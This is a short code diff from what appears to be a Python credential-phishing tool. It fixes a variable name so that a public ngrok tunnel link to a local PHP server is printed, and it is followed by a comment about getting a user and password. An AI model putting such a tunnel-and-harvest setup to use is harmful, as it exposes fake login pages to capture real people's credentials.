@@ -559,7 +559,7 @@ exit();""")
        phpserver()
        global token
        link = ngrok.connect(6060,"http",auth_token=token)
-       print(Fore.GREEN+" [+]"+Fore.WHITE+str(a).replace('"','').replace("NgrokTunnel:","").replace("http://","https://"))
+       print(Fore.GREEN+" [+]"+Fore.WHITE+str(link).replace('"','').replace("NgrokTunnel:","").replace("http://","https://"))
 
        
  # Getting User And Password
